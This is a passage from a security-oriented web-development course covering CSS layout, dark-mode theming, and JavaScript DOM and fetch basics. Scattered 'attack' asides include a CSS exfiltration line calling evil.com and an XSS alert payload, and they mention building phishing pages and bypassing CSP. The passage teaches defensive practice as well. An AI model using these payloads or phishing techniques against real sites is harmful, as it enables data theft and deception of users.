• Descendant: article p – any <p> inside <article> (at any depth).
  • Child: nav > a – <a> elements that are direct children of <nav>.
  • Adjacent sibling: h2 + p – the <p> immediately following an <h2>.
  • General sibling: h2 ~ p – all <p> siblings that come after <h2>.

Attack perspective: Combinators allow precise targeting; if you find a specific pattern (e.g., all links inside a certain div), you can craft CSS injection payloads that select those elements and exfiltrate their attribute values.

docs.title: 2.5 Pseudo‑classes and Pseudo‑elements
docs.text:
• Pseudo‑classes specify a special state: :hover, :focus, :first-child, :nth-child(odd), :not(selector).
  • Pseudo‑elements style a part of an element: ::before, ::after (insert content), ::first-line.

Example: a:hover { text-decoration: underline; }.

docs.title: 2.6 The Cascade and Specificity
docs.text:
When multiple rules could apply to the same element, the browser decides which wins using: 1. Importance: !important overrides normal declarations (use sparingly). 2. Specificity (calculated as a triple (a, b, c)): - a = 1 if inline style, else 0. - b = number of ID selectors. - c = number of class selectors, attributes selectors, and pseudo‑classes. - d = number of type selectors and pseudo‑elements (lower specificity). Universal selector (), combinators, and :not() add no specificity. 3. Source order*: if specificity is equal, the later rule wins.

Example:

p { color: green; }              /* specificity (0,0,0,1) */
.intro { color: blue; }          /* (0,0,1,0) – wins */
#main p { color: red; }          /* (0,1,0,1) – wins over both */

Understanding specificity is crucial when injecting styles; you may need to override existing rules by increasing specificity or using !important.

docs.title: Part III – The Box Model: Every Element Is a Rectangle
3.1 Content
docs.text:
• The actual area containing text or child elements.
  • Size controlled by width and height (for block and inline‑block elements).

docs.title: 3.2 Padding
docs.text:
• Space inside the element, between content and border.
  • padding: top right bottom left; (clockwise). Shorthand: padding: 10px 20px; (vertical horizontal).
  • Background color/image extends into padding.

docs.title: 3.3 Border
docs.text:
• The edge of the element. border: width style color;
  • Separate sides: border-left, border-bottom, etc.
  • border-radius creates rounded corners.

docs.title: 3.4 Margin
docs.text:
• Space outside the border, separating this element from others.
  • Margins collapse vertically between adjacent block elements: the larger margin wins, not the sum.
  • margin: auto; on a block with width horizontally centres it.

docs.title: 3.5 box-sizing – Changing the Box Model
docs.text:
By default (box-sizing: content-box), width sets the content width; total element width = content + padding + border. Using box-sizing: border-box makes width include padding and border, which is far more intuitive for layouts. Most CSS resets include:

*, *::before, *::after {
    box-sizing: border-box;
}

I recommend you include this in your stylesheet from the start.

docs.title: 3.6 Debugging the Box Model
docs.text: In browser DevTools, the Computed tab shows the exact box model for any selected element, with pixel values for margin, border, padding, and content. Use it whenever something doesn’t size right.

docs.title: Part IV – Display and Positioning: Controlling Flow
4.1 Display Property
docs.text:
• display: block; – the element takes the full width available and starts on a new line (e.g., <div>, <p>, <h1>).
  • display: inline; – flows like text, height/width have no effect (e.g., <span>, <a>).
  • display: inline-block; – inline, but can have width/height and vertical margins/padding.
  • display: none; – element is removed from the flow and hidden.
  • display: flex; and display: grid; – turn the element into a flex or grid container (see Part VI).

docs.title: 4.2 Position Property
docs.text:
• position: static; – default, in normal flow.
  • position: relative; – offset from its normal position using top, right, bottom, left; still occupies original space.
  • position: absolute; – removed from normal flow; positioned relative to nearest positioned ancestor (or the initial containing block if none). Use top/right/bottom/left.
  • position: fixed; – relative to the viewport; stays in place on scroll.
  • position: sticky; – hybrid: behaves like relative until a scroll threshold, then becomes fixed.

Hacker insight: position: absolute with z-index stacking can create overlay attacks. When inspecting a suspicious page, check if elements are positioned outside the viewport or behind others.

docs.title: 4.3 Z‑Index and Stacking Context
docs.text:
• z-index controls the stacking order of positioned elements (must have a position other than static).
  • Higher z-index brings the element to the front.
  • Stacking contexts can be created by opacity, transforms, etc., limiting the effect of z-index.

docs.title: Part V – Colors, Typography, and Visual Styling
5.1 Colors
docs.text:
• Named colors: red, blue, transparent.
  • Hexadecimal: #ff0000 (RRGGBB), shorthand #f00.
  • RGB/RGBA: rgb(255, 0, 0), rgba(255, 0, 0, 0.5).
  • HSL/HSLA: hsl(0, 100%, 50%), hsla(0, 100%, 50%, 0.5).
  • CurrentColor: border: 1px solid currentColor;.

Attack note: CSS color can exfiltrate data if you use background: url('http://evil.com/steal?data=...'); in a style (CSS injection). We'll see that later.

docs.title: 5.2 Typography
docs.text:
• font-family: can be specific ("Times New Roman") or generic (serif, sans-serif, monospace). Use fallback list, e.g., font-family: 'Open Sans', Arial, sans-serif;.
  • font-size: absolute (16px, 1rem), relative (1.2em, larger). rem refers to root font size, em to the element’s own or inherited size.
  • font-weight: normal, bold, 100–900.
  • line-height: space between lines; unitless value preferred (e.g., 1.6).
  • text-align: left, center, right, justify.
  • text-decoration: underline, none, line-through.
  • color for text color, background-color for background.

docs.title: 5.3 Backgrounds
docs.text:
• background-color, background-image, background-repeat, background-position, background-size.
  • Shorthand: background: #fff url('bg.png') no-repeat center/cover;

docs.title: 5.4 Borders, Shadows, and More
docs.text:
• border already covered.
  • box-shadow: h-offset v-offset blur spread color; – creates shadow around an element.
  • text-shadow: h v blur color; – shadow on text.
  • border-radius: 10px; – rounded corners (50% makes a circle).

docs.title: Part VI – Layouts: Flexbox and Grid Deep Dive
docs.text: Modern layout uses Flexbox (one‑dimensional) and Grid (two‑dimensional). We’ll cover both, but focus on Flexbox as it’s simpler and widely used.

docs.title: 6.1 Flexbox: Layout in One Direction (Row or Column)
docs.text: To turn a container into a flex container: display: flex;. Its direct children become flex items.

docs.title: Container Properties (applied to the parent)
docs.text:
• flex-direction: row (default), column, row-reverse, column-reverse.
  • flex-wrap: nowrap (default, all items on one line), wrap, wrap-reverse.
  • justify-content: alignment along the main axis: flex-start, flex-end, center, space-between, space-around, space-evenly.
  • align-items: alignment along the cross axis (perpendicular): stretch (default), flex-start, flex-end, center, baseline.
  • align-content: when wrapping, how multiple lines are spaced on cross axis.
  • gap: sets gap between items (also row-gap, column-gap).

docs.title: Item Properties (applied to children)
docs.text:
• flex-grow: how item grows relative to others (default 0). If all set to 1, they share space equally.
  • flex-shrink: how item shrinks (default 1).
  • flex-basis: initial size before growing/shrinking (default auto).
  • flex: shorthand for grow, shrink, basis: flex: 1 0 auto;.
  • align-self: overrides align-items for this item.
  • order: changes visual order (danger: may break keyboard navigation logic).

Example – centred card:

.card-container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}
.card {
    background: white;
    padding: 2rem;
    border-radius: 8px;
}

Attack relevance: Changing order could rearrange form fields to trick users. flex helps in crafting convincing phishing pages that render perfectly on all screens.

docs.title: 6.2 CSS Grid: Two‑Dimensional Layouts
docs.text: Grid is more suited for full‑page layouts with rows and columns. A grid container is created with display: grid;.

docs.title: Grid Container
docs.text:
• grid-template-columns: 200px 1fr 2fr; – defines columns (fixed, fractional units).
  • grid-template-rows: auto 1fr auto; – rows.
  • grid-gap: now just gap.
  • grid-template-areas: named areas for easy layout.

docs.title: Grid Items
docs.text:
• grid-column: 1 / 3; – span columns.
  • grid-row: 2 / 4;.

Example – common page layout:

.page {
    display: grid;
    grid-template-rows: auto 1fr auto;
    grid-template-columns: 200px 1fr;
    min-height: 100vh;
}
header { grid-column: 1 / 3; }
nav    { grid-column: 1; grid-row: 2; }
main   { grid-column: 2; grid-row: 2; }
footer { grid-column: 1 / 3; }

docs.title: 6.3 Choosing Between Flexbox and Grid
docs.text:
• Use Flexbox for a single row or column (navigation bars, centering content, card rows).
  • Use Grid for overall page layout with multiple rows and columns simultaneously.
  • Both can be combined.

Resource: CSS Tricks Flexbox Guide – bookmark it and refer back often.

docs.title: Part VII – Responsive Design and Media Queries
docs.text: A responsive website adapts its layout to different screen sizes (mobile, tablet, desktop). The core tools are fluid layouts, flexible images, and media queries.

docs.title: 7.1 The Viewport Meta Tag
docs.text:
<meta name="viewport" content="width=device-width, initial-scale=1.0">

This tells mobile browsers to use the actual device width. Without it, mobile browsers render at a wider viewport and shrink the page.

docs.title: 7.2 Fluid Sizing
docs.text:
• Use max-width: 100% on images to prevent them from overflowing containers.
  • Use relative units (%, vw, vh, rem, em) instead of fixed pixels where possible.
  • vw = 1% of viewport width; vh = 1% of viewport height. Useful for full‑screen sections.

docs.title: 7.3 Media Queries
docs.text:
Media queries apply CSS rules only when certain conditions are true (e.g., screen width, orientation, resolution).

Syntax:

@media (max-width: 768px) {
    /* Styles for screens <= 768px wide */
    .container {
        flex-direction: column;
        padding: 1rem;
    }
}

Common breakpoints: - Mobile: max-width: 576px or 768px. - Tablet: max-width: 992px. - Desktop: min-width: 1200px.

You can also target print, prefers-color-scheme (for dark mode), prefers-reduced-motion.

docs.title: 7.4 Mobile‑First Approach
docs.text:
Start with styles for the smallest screens, then use min-width media queries to add complexity for larger screens. This results in simpler, faster mobile code.

Attack relevance: When fuzzing, a website might serve different content to different user agents or screen sizes (cloaking). Use a tool or browser DevTools to emulate mobile devices and see hidden admin panels.

docs.title: Part VIII – CSS Custom Properties (Variables) and Dark/Light Mode
8.1 CSS Custom Properties
docs.text:
Custom properties store values that can be reused throughout a stylesheet. They are defined inside a selector (usually :root) and accessed with var().

:root {
    --primary-color: #007bff;
    --bg-color: #ffffff;
    --text-color: #222222;
}
body {
    background-color: var(--bg-color);
    color: var(--text-color);
}
a {
    color: var(--primary-color);
}

This makes theming trivial: just override the variables in a different context.

docs.title: 8.2 The Dark/Light Mode Toggle
docs.text: We’ll implement a toggle that adds a data-theme="dark" attribute to the <html> element, then our CSS uses attribute selectors to redefine variables.

docs.title: JavaScript Toggle (minimal)
docs.text:
Add a button somewhere and a small script:

<button id="theme-toggle" aria-label="Toggle dark mode">🌓</button>
<script>
    const toggleBtn = document.getElementById('theme-toggle');
    const htmlElement = document.documentElement;

    // Check for saved preference or system preference
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme) {
        htmlElement.setAttribute('data-theme', savedTheme);
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        htmlElement.setAttribute('data-theme', 'dark');
    }

    toggleBtn.addEventListener('click', () => {
        let currentTheme = htmlElement.getAttribute('data-theme');
        if (currentTheme === 'dark') {
            htmlElement.setAttribute('data-theme', 'light');
            localStorage.setItem('theme', 'light');
        } else {
            htmlElement.setAttribute('data-theme', 'dark');
            localStorage.setItem('theme', 'dark');
        }
    });
</script>

docs.title: CSS Variables Switch
docs.text:
:root,
[data-theme="light"] {
    --bg-color: #ffffff;
    --text-color: #333333;
    --card-bg: #f5f5f5;
    --link-color: #0066cc;
}
[data-theme="dark"] {
    --bg-color: #1a1a1a;
    --text-color: #e0e0e0;
    --card-bg: #2d2d2d;
    --link-color: #66b3ff;
}

Then use the variables everywhere.

Note on prefers-color-scheme: You can use the media query directly to set variables without JavaScript:

@media (prefers-color-scheme: dark) {
    :root { /* dark variables */ }
}

But adding a manual toggle requires JS to override the preference. Our approach combines both: check system default on load, then allow the user to switch and persist to localStorage.

docs.title: Part IX – Practical Lab: Styling Your Portfolio + Theme Toggle
docs.text: Now we transform the bare HTML portfolio from Week 9 into a beautiful, responsive, theme‑ready website.

docs.title: 9.1 Setup
docs.text:
Create a folder ~/portfolio with your HTML files and a new style.css. Link the stylesheet in each HTML file’s <head>:

<link rel="stylesheet" href="style.css">

Also add the viewport meta tag if not already present.

docs.title: 9.2 CSS Reset and Base Variables
docs.text:
Create style.css:

/* Reset */
*,
*::before,
*::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

/* Custom properties for light theme (default) */
:root {
    --bg-color: #ffffff;
    --text-color: #333333;
    --primary-color: #0d6efd;
    --secondary-color: #6c757d;
    --card-bg: #f8f9fa;
    --code-bg: #f1f1f1;
    --border-color: #dee2e6;
    --font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
    --max-width: 960px;
    --base-padding: 1.5rem;
}

/* Dark theme */
[data-theme="dark"] {
    --bg-color: #121212;
    --text-color: #e0e0e0;
    --primary-color: #4dabf7;
    --secondary-color: #adb5bd;
    --card-bg: #1e1e1e;
    --code-bg: #2a2a2a;
    --border-color: #333;
}

/* Base typography */
html {
    font-family: var(--font-family);
    font-size: 16px;
    line-height: 1.6;
    background-color: var(--bg-color);
    color: var(--text-color);
    scroll-behavior: smooth;
}

docs.title: 9.3 Header, Navigation, and Layout
docs.text:
We’ll make the header a flex container, the nav horizontal, and the main content capped at a max width.

/* Header and nav */
body {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
}
header {
    background-color: var(--card-bg);
    padding: var(--base-padding);
    border-bottom: 1px solid var(--border-color);
}
.header-content {
    max-width: var(--max-width);
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.logo {
    font-size: 1.8rem;
    font-weight: bold;
    color: var(--primary-color);
    text-decoration: none;
}
nav {
    display: flex;
    gap: 1.5rem;
}
nav a {
    color: var(--text-color);
    text-decoration: none;
    font-weight: 500;
    transition: color 0.2s;
}
nav a:hover {
    color: var(--primary-color);
}

docs.title: 9.4 Main Content Area
docs.text:
main {
    flex: 1;
    max-width: var(--max-width);
    width: 100%;
    margin: 0 auto;
    padding: var(--base-padding);
}
footer {
    background-color: var(--card-bg);
    text-align: center;
    padding: 1rem;
    font-size: 0.9rem;
    border-top: 1px solid var(--border-color);
}

docs.title: 9.5 Cards for Projects and Skills
docs.text:
We’ll create a card style for sections like “Recent Projects” and the skills table.

.card {
    background-color: var(--card-bg);
    border: 1px solid var(--border-color);
    border-radius: 8px;
    padding: 1.5rem;
    margin-bottom: 2rem;
    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
}
.card h2 {
    margin-top: 0;
}

docs.title: 9.6 Table Styling
docs.text:
table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 1rem;
}
table th, table td {
    padding: 0.75rem;
    text-align: left;
    border-bottom: 1px solid var(--border-color);
}
table th {
    background-color: var(--code-bg);
}

docs.title: 9.7 Form Styling
docs.text:
form {
    background-color: var(--card-bg);
    padding: 2rem;
    border-radius: 8px;
    border: 1px solid var(--border-color);
    max-width: 600px;
}
fieldset {
    border: 1px solid var(--border-color);
    padding: 1rem;
    margin-bottom: 1.5rem;
    border-radius: 4px;
}
legend {
    font-weight: bold;
}
label {
    display: block;
    margin: 0.5rem 0 0.2rem;
}
input, textarea, select {
    width: 100%;
    padding: 0.6rem;
    font-size: 1rem;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    background-color: var(--bg-color);
    color: var(--text-color);
    font-family: inherit;
}
input:focus, textarea:focus, select:focus {
    outline: 2px solid var(--primary-color);
    border-color: var(--primary-color);
}
button, input[type="submit"], input[type="reset"] {
    width: auto;
    padding: 0.6rem 1.5rem;
    margin-right: 0.5rem;
    cursor: pointer;
    background-color: var(--primary-color);
    color: white;
    border: none;
    border-radius: 4px;
    font-weight: 600;
    transition: background-color 0.2s;
}
button:hover {
    opacity: 0.9;
}

docs.title: 9.8 Theme Toggle Button
docs.text:
Place the button in the header alongside the nav, or fixed at the bottom right.

#theme-toggle {
    background: transparent;
    border: 2px solid var(--primary-color);
    color: var(--primary-color);
    border-radius: 50%;
    width: 40px;
    height: 40px;
    font-size: 1.3rem;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
}

docs.title: 9.9 Responsive Tweaks
docs.text:
Add a media query for smaller screens:

@media (max-width: 768px) {
    .header-content {
        flex-direction: column;
        align-items: flex-start;
    }
    nav {
        margin-top: 1rem;
        flex-wrap: wrap;
    }
    main {
        padding: 1rem;
    }
}

docs.title: 9.10 Putting It All Together
docs.text:
Your HTML files need minimal updates: - In each <body>, wrap header content in a <div class="header-content"> to contain the logo, nav, and toggle. - Example header:

<header>
    <div class="header-content">
        <a href="index.html" class="logo">Jane Hacker</a>
        <nav>
            <a href="index.html">Home</a>
            <a href="about.html">About</a>
            <a href="contact.html">Contact</a>
            <button id="theme-toggle" aria-label="Toggle dark mode">🌓</button>
        </nav>
    </div>
</header>
  • Add the JavaScript snippet just before </body> (or in an external script.js).

Now open http://localhost:8000 again. You’ll see a professional site. Click the toggle; the theme switches, and the preference is remembered on reload.

docs.title: 9.11 Validation and Testing
docs.text:
• Test the form: hover, focus, input styling.
  • Resize browser to mobile width; check that the layout stacks.
  • Use DevTools to inspect the box model and see the applied variables.
  • Validate CSS with W3C CSS Validator.

docs.title: Part X – Week 10 Milestone Verification
docs.text:
By Sunday, you must:

  1. Styled portfolio with:
  2. A consistent header/nav/footer layout across all pages.
  3. Use of CSS custom properties for all colors.
  4. Dark/Light theme toggle that works, with persistent preference (localStorage).
  5. At least one use of Flexbox (e.g., the nav) and optionally Grid for the main layout.
  6. Styled form inputs and table.
  7. Responsive design: the site looks good on both desktop and mobile (use browser device toolbar to test).
  8. Code quality: No inline styles (except maybe the toggle), external stylesheet linked, CSS is valid.
  9. Demonstrate understanding:
  10. In your notes, explain the box model and why box-sizing: border-box is helpful.
  11. Explain the cascade and specificity with a concrete example.
  12. Describe how you implemented dark mode and how the toggle persists.
  13. (Optional) Add a CSS transition or animation (e.g., fade-in on page load).
  14. Bonus: Add prefers-reduced-motion media query to disable transitions if user prefers reduced motion.

docs.title: Part XI – Cheat Sheet for Week 10
docs.text: Concept Syntax / Usage Selectors element, .class, #id, [attr="val"], :pseudo, ::pseudo Box model margin, border, padding, content box-sizing border-box includes padding/border in width Flex container display: flex; Justify content justify-content: center / space-between Align items align-items: center Gap gap: 1rem Grid display: grid; grid-template-columns: 1fr 1fr; Media query @media (max-width: 768px) { ... } Custom properties --name: value; and var(--name) Dark mode switch [data-theme="dark"] override variables localStorage localStorage.setItem('theme', 'dark') / getItem Transition transition: property duration ease; Center a div (Flex) display: flex; justify-content: center; align-items: center; Responsive images max-width: 100%; height: auto;

docs.title: Part XII – What’s Next?
docs.text:
Week 11 will finally bring JavaScript to life: variables, functions, DOM manipulation, and fetch API. You’ll add interactivity to your portfolio – form validation, a weather API call – turning your static site into a dynamic application. That will lay the groundwork for understanding XSS attacks, because you’ll know exactly how JavaScript interacts with the DOM.

But before you rush ahead, take pride in your themed portfolio. It’s now a fully responsive, toggle‑able website that you built from scratch. More importantly, you understand its styles so deeply that you could manipulate them to hide, reveal, or even exfiltrate information – and that’s a hacker’s edge.

Dark mode mastered. Onward!

docs.title: Week 11: JavaScript & The Browser DOM – From Static Pages to Dynamic Applications
docs.text:
This week you will bring your portfolio site to life. JavaScript is the programming language of the browser: it reads and writes the HTML and CSS, reacts to user actions, and communicates with remote servers. For a web exploiter, JavaScript is both a weapon (XSS, DOM‑based attacks) and a reconnaissance tool (sniffing API calls, bypassing client‑side restrictions). You must know it as well as you know Python.

We start with the language fundamentals, then dive into the Document Object Model (DOM)—the live tree representation of the page—and learn to select, modify, and create elements. You’ll handle events (clicks, form submissions) and finally master the Fetch API to talk to remote servers without reloading the page.

By the end, you will have transformed your static portfolio into an interactive experience: a contact form with proper client‑side validation and a live weather widget that fetches real data from a free API. And you’ll have the foundational knowledge to later craft XSS payloads and exploit JavaScript‑heavy applications.

docs.title: Part I – JavaScript in the Browser: Where It Lives and How to Run It
1.1 Including JavaScript in HTML
docs.text:
Three ways to add JavaScript to a web page:

  1. Inline: inside an HTML attribute (e.g., <button onclick="alert('clicked')">). Avoid for maintainability and security (CSP blocks it).
  2. Internal <script> block: placed anywhere in <head> or <body>. ```html

`` 3. **External file** (best practice):. Thedeferattribute ensures the script runs after the HTML is fully parsed, but beforeDOMContentLoaded`.

For our portfolio, we’ll use an external script.js with defer.

docs.title: 1.2 The Browser Console
docs.text:
Open your browser’s Developer Tools (F12) and click the Console tab. You can type any JavaScript expression here and see the result immediately—it’s the equivalent of Python’s REPL. We’ll use it heavily for experimentation.

Type:

console.log("Hi!");
2 + 2
document.title

The console is also where error messages appear—your first debugging tool.

docs.title: 1.3 "use strict" Mode
docs.text: Always start your scripts with "use strict"; to enforce cleaner code and prevent common mistakes (like accidentally creating global variables). We’ll use it.

docs.title: Part II – JavaScript Core Syntax: Variables, Data Types, and Operators
2.1 Variables: let, const, and var
docs.text:
• let: block‑scoped variable, can be reassigned.
  • const: block‑scoped, cannot be reassigned (but objects and arrays can be mutated).
  • var: function‑scoped, older, avoid it.
let name = "Ada";
const PI = 3.14159;
name = "Hacker";   // OK
// PI = 3;         // Error: Assignment to constant variable.

docs.title: 2.2 Data Types
docs.text:
Primitives: number, string, boolean, null, undefined, symbol, bigint. - typeof operator: typeof "hello" returns "string". - null is an object (historic bug), but it’s a separate type. - undefined means a variable has been declared but not assigned.

Dynamic typing: variables can hold any type, and types can change.

docs.title: 2.3 Strings and Template Literals
docs.text:
Strings can be single‑ or double‑quoted. Template literals use backticks and allow embedding expressions with ${}:

const user = "Ada";
const greeting = `Hello, ${user}!`;

Multi‑line strings are easy with backticks.

docs.title: 2.4 Operators
docs.text: Arithmetic: + - * / % **. The + also concatenates strings. Comparison: === (strict equality, no type coercion) and !==; == performs coercion (avoid). <, >, <=, >=. Logical: &&, ||, !. Short‑circuit: false && anything → false; true || anything → true. Ternary: condition ? valueIfTrue : valueIfFalse.

docs.title: 2.5 Type Coercion Pitfalls
docs.text:
5 + "5"   // "55" (number coerced to string)
"5" * 2   // 10 (string coerced to number)
0 == false  // true
0 === false // false

Use === and !== to avoid surprising results. This is important when validating user input.

docs.title: Part III – Control Flow: Making Decisions and Looping
3.1 Conditionals
docs.text:
Same as Python but with curly braces and parentheses required.

if (score >= 90) {
    grade = "A";
} else if (score >= 80) {
    grade = "B";
} else {
    grade = "F";
}

docs.title: 3.2 switch Statement
docs.text:
switch (day) {
    case "Monday":
        console.log("Start of week");
        break;
    default:
        console.log("Other day");
}

Without break, execution falls through – a common bug.

docs.title: 3.3 Loops
docs.text:
• for loop: for (let i = 0; i < 5; i++) { … }
  • while loop: while (condition) { … }
  • do…while: runs at least once.
  • for…of: iterate over iterable values (arrays, strings): for (const item of array) { … }
  • for…in: iterates over keys of an object (use with caution, includes prototype).

Breaking: break exits loop; continue skips to next iteration.

docs.title: 3.4 Looping over Arrays with forEach, map, filter
docs.text:
Functional methods:

const numbers = [1, 2, 3, 4];
numbers.forEach(num => console.log(num));
const doubled = numbers.map(num => num * 2);
const evens = numbers.filter(num => num % 2 === 0);

We’ll use these extensively.

docs.title: 4.1 Function Declarations
docs.text:
function add(a, b) {
    return a + b;
}

Hoisted: you can call the function before its definition (not true for other forms).

docs.title: 4.2 Function Expressions
docs.text:
Assign a function to a variable (not hoisted).

const multiply = function(a, b) {
    return a * b;
};

docs.title: 4.3 Arrow Functions
docs.text:
Shorter syntax, this is lexically bound (from surrounding context). Great for callbacks.

const divide = (a, b) => a / b;
const greet = name => `Hello ${name}`;
const complex = (a, b) => {
    const sum = a + b;
    return sum * 2;
};

docs.title: 4.4 Parameters and Default Values
docs.text: You can set defaults: function greet(name = "stranger"). Rest parameters ...args capture remaining arguments into an array.

docs.title: 4.5 Scope and Closures
docs.text:
• let and const are block‑scoped ({}). var is function‑scoped.
  • Functions can access variables from their outer (enclosing) scope; this is closure.
function createCounter() {
    let count = 0;
    return function() {
        count += 1;
        return count;
    };
}
const counter = createCounter();
console.log(counter()); // 1
console.log(counter()); // 2

Closures are used extensively in event handlers.

docs.title: Part V – Objects and Arrays: Organising Data
5.1 Objects
docs.text:
An object is a collection of key‑value pairs (properties).

const user = {
    name: "Ada",
    age: 30,
    greet() {
        console.log(`Hi, I'm ${this.name}`);
    }
};
user.name   // dot notation
user["age"] // bracket notation (key as string)

Add/delete properties: user.hobby = "hacking"; delete user.age;.

docs.title: 5.2 this Keyword
docs.text: In a method, this refers to the object the method was called on. Arrow functions do not have their own this; they capture the outer one. This difference is crucial in event handlers: we’ll use regular functions or explicitly bind.

docs.title: 5.3 Arrays
docs.text:
Ordered, zero‑indexed, can hold mixed types.

const fruits = ["apple", "banana"];
fruits.push("cherry");
fruits.pop();
fruits.unshift("mango"); // add to beginning
fruits.splice(1, 1);     // remove 1 element at index 1
fruits.indexOf("apple");

docs.title: 5.4 JSON (JavaScript Object Notation)
docs.text: JSON is a text format that closely resembles JavaScript object literals. Convert: - JSON.stringify(obj) → string - JSON.parse(string) → object We’ll use this with localStorage and API responses.

docs.title: Part VI – The Document Object Model (DOM): The Living HTML
6.1 What is the DOM?
docs.text: When the browser parses an HTML document, it builds a tree of nodes. Each tag becomes an element node, text becomes a text node, attributes become properties. JavaScript can access this tree via the global document object.

docs.title: 6.2 Selecting Elements
docs.text:
• document.getElementById("id") – returns single element.
  • document.querySelector("selector") – returns the first element matching any CSS selector.
  • document.querySelectorAll("selector") – returns a static NodeList (like an array) of all matches.
  • Older: getElementsByClassName, getElementsByTagName – live collections, less used now.

Examples:

const header = document.querySelector("header");
const navLinks = document.querySelectorAll("nav a");
const mainHeading = document.getElementById("main-heading");

docs.title: 6.3 Reading and Modifying Content
docs.text:
• element.textContent – gets/sets the text, stripping any HTML. Safe.
  • element.innerHTML – gets/sets the HTML content. Security risk: if you insert unsanitised user input, you create XSS. Only use when you control the content.
  • element.innerText – similar to textContent but respects styling (e.g., hidden text isn’t returned). Avoid due to performance.

Reading/writing attributes: - element.getAttribute("href"), element.setAttribute("href", "new"), element.removeAttribute("disabled"). - Shortcut: element.id, element.className, element.href (for links), element.src (for images), element.checked (for checkboxes).

Modifying classes (preferred over className): - element.classList.add("class"), .remove("class"), .toggle("class"), .contains("class").

Modifying inline styles: - element.style.color = "red" – sets inline style property. Use sparingly; prefer manipulating classes.

docs.title: 6.4 Creating and Adding Elements
docs.text:
const newParagraph = document.createElement("p");
newParagraph.textContent = "This is a dynamically added paragraph.";
newParagraph.classList.add("note");

// Append to body or any container
document.body.appendChild(newParagraph);

You can also prepend(), insertBefore(), replaceChild().

docs.title: 6.5 Removing Elements
docs.text:
element.remove(); // modern method
// or parent.removeChild(element);

docs.title: 6.6 Traversing the DOM
docs.text:
• Parent: node.parentElement
  • Children: node.children (HTMLCollection), node.childNodes (includes text nodes).
  • Siblings: node.nextElementSibling, node.previousElementSibling.
  • First/last child: node.firstElementChild, node.lastElementChild.

docs.title: Part VII – Events: Responding to User Actions
7.1 The addEventListener Method
docs.text:
Attach a function to an element to be called when a specific event occurs.

const button = document.querySelector("#myButton");
button.addEventListener("click", function(event) {
    console.log("Button clicked!", event);
});

The callback receives an event object with useful properties like event.target (the element that triggered the event), event.type, and methods like event.preventDefault() (stops default behaviour, e.g., form submission).

docs.title: 7.2 Common Event Types
docs.text:
• Mouse: click, dblclick, mousedown, mouseup, mousemove, mouseenter, mouseleave.
  • Keyboard: keydown, keyup, keypress (deprecated). Event object has key (e.g., "Enter", "a") and code.
  • Form: submit (on <form>), input, change, focus, blur.
  • Document/Window: DOMContentLoaded (HTML parsed, DOM built), load (all resources loaded), scroll, resize.

docs.title: 7.3 Handy Example: Listening for the “Enter” Key in an Input
docs.text:
input.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        // user pressed Enter
    }
});

docs.title: 7.4 Event Bubbling and Delegation
docs.text: Events bubble up: if you click a button inside a div, the event fires on the button then on the div, then body, then document. You can stop bubbling with event.stopPropagation(), but often we use event delegation: attach one listener to a parent and use event.target to decide which child was clicked. This is more efficient for dynamic elements.

docs.title: 7.5 Custom Events (Advanced, but cool)
docs.text: You can dispatch your own events using new CustomEvent() and element.dispatchEvent(). Not needed now, but good to know.

docs.title: Part VIII – The Fetch API: Talking to the Outside World
8.1 Why Fetch?
docs.text: fetch() is the modern way to make HTTP requests from JavaScript. It replaces XMLHttpRequest and works with Promises.

docs.title: 8.2 Basic GET Request
docs.text:
fetch('https://api.example.com/data')
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json(); // parse JSON
    })
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error('Fetch error:', error);
    });

docs.title: 8.3 Async/Await – The Cleaner Way
docs.text:
Using async functions and await makes asynchronous code read like synchronous:

async function getData() {
    try {
        const response = await fetch('https://api.example.com/data');
        if (!response.ok) throw new Error(`Status: ${response.status}`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error(error);
    }
}

You can only use await inside an async function (or at top level in modules).

docs.title: 8.4 Sending Data with POST
docs.text:
const payload = { username: 'alice', password: 'secret' };
const response = await fetch('/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
});
const result = await response.json();

docs.title: 8.5 Handling Responses
docs.text:
• response.json() – parse JSON.
  • response.text() – plain text.
  • response.blob() – binary data.
  • response.status – HTTP status code.
  • response.ok – true if status 200‑299.

docs.title: 8.6 CORS (Cross‑Origin Resource Sharing)
docs.text: For security, browsers restrict cross‑origin HTTP requests initiated by scripts. If you fetch from http://localhost:8000 to https://api.openweathermap.org, the server must include the header Access-Control-Allow-Origin: * or your domain. Many public APIs allow all origins; some require a key. For testing, you can use a proxy or disable browser same‑origin policy (unsafe). We’ll choose APIs that support CORS or use a simple trick: use a free CORS proxy or a mock API if needed.

docs.title: Part IX – Client‑Side Security: XSS and You
9.1 Cross‑Site Scripting (XSS) 101
docs.text:
XSS occurs when an attacker can inject malicious JavaScript into a page viewed by other users. The simplest form? A page that takes a URL parameter like ?name=Bob and writes <h1>Hello Bob</h1> using innerHTML without sanitisation. If I set ?name=<script>alert('XSS')</script>, the script executes.

Never use innerHTML or outerHTML with user‑controlled data. Use textContent or safe DOM methods.

docs.title: 9.2 Content Security Policy (CSP)
docs.text: A server response header (Content-Security-Policy) tells the browser which scripts are allowed to run. It can block inline scripts, inline styles, and restrict sources. As a hacker, you may need to bypass CSP when constructing advanced XSS payloads. For now, know that CSP is why many attacks require <script> from external sources or event handlers (onerror, onload).

docs.title: 9.3 Safe DOM Practices
docs.text:
• Use textContent for text.
  • When you must set HTML (e.g., rendering rich text), use DOMpurify (a library) or very careful escaping.
  • Validate and sanitise all user inputs.

docs.title: Part X – Practical Lab 1: Client‑Side Form Validation
docs.text: Now we’ll enhance your contact form (from Week 9) with JavaScript validation. The user should see error messages immediately, and the form should not submit unless all fields pass.

docs.title: 10.1 Goal
docs.text:
